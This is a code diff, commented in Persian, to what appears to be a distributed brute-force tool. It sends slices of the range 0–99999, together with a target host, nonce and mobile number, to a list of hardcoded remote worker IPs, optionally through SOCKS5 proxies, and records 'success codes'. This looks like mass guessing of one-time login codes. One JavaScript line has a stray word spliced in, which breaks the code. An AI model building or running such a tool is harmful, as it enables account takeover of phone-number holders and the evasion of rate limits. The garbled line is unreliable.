@@ -10,7 +10,6 @@ REMOTE_SERVERS = [
     "http://63.142.254.127:5000",
     "http://63.142.246.30:5000",
     "http://185.189.27.75:5000",
-    "http://185.183.182.191:5000",
     "http://185.185.126.164:5000",
     "http://104.251.211.205:5000",
     "http://185.189.27.11:5000",
@@ -19,18 +18,11 @@ REMOTE_SERVERS = [
     "http://104.251.219.67:5000",
 ]
 
-RANGES = [
-    (0, 10000),
-    (10000, 20000),
-    (20000, 30000),
-    (30000, 40000),
-    (40000, 50000),
-    (50000, 60000),
-    (60000, 70000),
-    (70000, 80000),
-    (80000, 90000),
-    (90000, 99999),
-]
+# حذف RANGES ثابت و استفاده از تابع پویا
+def generate_ranges(num_servers):
+    total_range = 100000  # از 0 تا 99999
+    chunk_size = total_range // num_servers
+    return [(i * chunk_size, (i + 1) * chunk_size if i < num_servers - 1 else total_range) for i in range(num_servers)]
 
 progress_log = []
 found_success = False
@@ -39,7 +31,6 @@ success_codes = []
 def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range, proxy_ip="", proxy_port=""):
     """ارسال درخواست به سرور ریموت"""
     try:
-        # ساخت آدرس پروکسی اگه IP و پورت داده شده باشه
         proxy = f"socks5://{proxy_ip}:{proxy_port}" if proxy_ip and proxy_port else ""
         response = requests.post(
             f"{server_url}/start",
@@ -50,7 +41,7 @@ def send_to_remote(server_url, host, nonce, mobile, connections, start_range, en
                 "connections": connections,
                 "startRange": start_range,
                 "endRange": end_range,
-                "proxy": proxy  # ارسال پروکسی به ورکر (اگه خالی باشه، "" می‌فرسته)
+                "proxy": proxy
             },
             timeout=10
         )
@@ -231,7 +222,6 @@ def index():
     "http://63.142.254.127:5000",
     "http://63.142.246.30:5000",
     "http://185.189.27.75:5000",
-    "http://185.183.182.191:5000",
     "http://185.185.126.164:5000",
     "http://104.251.211.205:5000",
     "http://185.189.27.11:5000",
@@ -297,7 +287,7 @@ def index():
 
             startBtn.addEventListener('click', () => {
                 const host = document.getElementById('host').value;
-                const nonce = document.getElementById('nonce').value;
+bundled                const nonce = document.getElementById('nonce').value;
                 const mobile = document.getElementById('mobile').value;
                 const connections = document.getElementById('connections').value;
                 const proxy_ip = document.getElementById('proxy_ip').value;
@@ -361,7 +351,7 @@ def start():
     socketio.emit('update_progress', {'log': progress_log[-1]})
 
     if scan_type == 'full':
-        ranges = RANGES
+        ranges = generate_ranges(len(REMOTE_SERVERS))  # رنج‌ها به صورت پویا بر اساس تعداد سرورها
     else:
         start_range = int(start_range)
         end_range = int(end_range)
